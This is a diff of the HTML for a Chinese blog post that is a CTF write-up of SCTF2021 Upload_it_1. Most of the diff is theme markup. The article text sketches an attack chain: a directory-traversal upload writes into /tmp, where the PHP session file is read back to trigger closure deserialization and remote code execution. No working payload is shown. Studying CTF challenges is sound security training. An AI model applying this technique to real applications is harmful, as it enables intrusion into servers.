@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>[SCTF2021]Upload_it_1复现闭包组件反序列化rce - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[SCTF2021]Upload_it_1复现闭包组件反序列化rce" />
-<meta property="og:description" content="题目地址 SycloverTeam提供了题目的docker环境 https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1 wp 首先题目给了composer.json 1 2 3 4 5 6 7 8 9 10 11 12 13 { &#34;name&#34;: &#34;sctf2021/upload&#34;, &#34;authors&#34;: [ {" />
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">[SCTF2021]Upload_it_1复现闭包组件反序列化rce - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[SCTF2021]Upload_it_1复现闭包组件反序列化rce" />
+<meta property="og:description" content="题目地址SycloverTeam提供了题目的docker环境 https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1 wp首先题目给了composer.json 1 2 3 4 5 6 7 8 9 10 11 12 13 { &#34;name&#34;: &#34;sctf2021/upload&#34;, &#34;authors&#34;: [" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://example.com/sctf2021/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-02-13T19:12:40+08:00" />
@@ -15,11 +16,15 @@
 <meta name="twitter:image" content="https://example.com/logo.png"/>
 
 <meta name="twitter:title" content="[SCTF2021]Upload_it_1复现闭包组件反序列化rce"/>
-<meta name="twitter:description" content="题目地址 SycloverTeam提供了题目的docker环境 https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1 wp 首先题目给了composer.json 1 2 3 4 5 6 7 8 9 10 11 12 13 { &#34;name&#34;: &#34;sctf2021/upload&#34;, &#34;authors&#34;: [ {"/>
+<meta name="twitter:description" content="题目地址SycloverTeam提供了题目的docker环境 https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1 wp首先题目给了composer.json 1 2 3 4 5 6 7 8 9 10 11 12 13 { &#34;name&#34;: &#34;sctf2021/upload&#34;, &#34;authors&#34;: ["/>
 <meta name="application-name" content="LoveIt">
-<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="apple-mobile-web-app-title" content="LoveIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/sctf2021/" /><link rel="prev" href="https://example.com/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" /><link rel="next" href="https://example.com/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://example.com/sctf2021/" /><link rel="prev" href="https://example.com/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" /><link rel="next" href="https://example.com/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -28,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/example.com\/sctf2021\/"
-        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1045 ,
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1046 ,
         "url": "https:\/\/example.com\/sctf2021\/","datePublished": "2022-02-13T19:12:40+08:00","dateModified": "2022-02-13T19:12:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -42,31 +47,38 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
             <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
-                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/sctf2021/" selected>简体中文</option></select>
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" title="Select Language" id="language-select-desktop" onchange="location = this.value;"><option value="/sctf2021/" selected>简体中文</option></select>
                     </a><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
-                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a>
-            </div>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
         </div>
     </div>
 </header><header class="mobile" id="header-mobile">
@@ -82,46 +94,53 @@
         <div class="menu" id="menu-mobile"><div class="search-wrapper">
                     <div class="search mobile" id="search-mobile">
                         <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
                     </div>
-                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
                         取消
                     </a>
-                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
-                    <select class="language-select" onchange="location = this.value;"><option value="/sctf2021/" selected>简体中文</option></select>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="#" onclick="return false;" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" title="Select Language" onchange="location = this.value;"><option value="/sctf2021/" selected>简体中文</option></select>
                 </a></div>
     </div>
-</header><div class="search-dropdown desktop">
-        <div id="search-dropdown-desktop"></div>
-    </div>
-    <div class="search-dropdown mobile">
-        <div id="search-dropdown-mobile"></div>
-    </div><main class="main">
-                <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">目录</h2>
-            <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[SCTF2021]Upload_it_1复现闭包组件反序列化rce</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
-</span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>技术分享</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-02-13">2022-02-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1045 字&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 3 分钟&nbsp;<i class="far fa-eye fa-fw"></i>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
-            </div>
-        </div><div class="details toc" id="toc-static"  data-kept="">
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#题目地址">题目地址</a></li>
+    <li><a href="#wp">wp</a></li>
+    <li><a href="#预期解">预期解</a></li>
+    <li><a href="#思路">思路</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[SCTF2021]Upload_it_1复现闭包组件反序列化rce</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Huamang</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"><i class="far fa-folder fa-fw"></i>技术分享</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-13">2022-02-13</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-02-13">2022-02-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1046 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
-                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
@@ -131,12 +150,11 @@
     <li><a href="#思路">思路</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h1 id="题目地址">题目地址</h1>
-<p>SycloverTeam提供了题目的docker环境
-<a href="https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1" target="_blank" rel="noopener noreffer">https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1</a>
-</p>
-<h1 id="wp">wp</h1>
-<p>首先题目给了composer.json</p>
+            </div><div class="content" id="content"><h1 id="题目地址" class="headerLink">
+    <a href="#%e9%a2%98%e7%9b%ae%e5%9c%b0%e5%9d%80" class="header-mark"></a>题目地址</h1><p>SycloverTeam提供了题目的docker环境
+<a href="https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1" target="_blank" rel="noopener noreferrer">https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1</a></p>
+<h1 id="wp" class="headerLink">
+    <a href="#wp" class="header-mark"></a>wp</h1><p>首先题目给了composer.json</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -181,23 +199,23 @@
 </code></pre></td></tr></table>
 </div>
 </div><p>composer update一下</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        data-srcset="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        title="在这里插入图片描述" /></p>
+<p><a class="lightgallery" href="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+            data-srcset="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+    </a></p>
 <p>第二个组件是关于闭包反序列化的，所以猜测和序列化有关
-<img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        data-srcset="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        title="在这里插入图片描述" /></p>
+<a class="lightgallery" href="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+            data-srcset="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+    </a></p>
 <p>index.php内的主要逻辑代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -239,35 +257,35 @@
 </div>
 </div><p>这里会调用<code>$_SESSION[&quot;upload_path&quot;]</code>，那么考虑到session反序列化
 题目测试到，上传可以进行目录穿越，但是只有tmp目录可写</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        data-srcset="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
-        title="在这里插入图片描述" /></p>
+<p><a class="lightgallery" href="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16" title="在这里插入图片描述" data-thumbnail="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+        <img
+            class="lazyload"
+            data-src="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+            data-srcset="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+            data-sizes="auto"
+            alt="https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16">
+    </a></p>
 <p>题目有给到phpinfo()，打开看一下，path没给，但是能操作的目录只有tmp，那么肯定就是/tmp/sess_xxxx了</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png"
-        data-srcset="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png, https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png 1.5x, https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png 2x"
-        data-sizes="auto"
-        alt="https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png"
-        title="在这里插入图片描述" /></p>
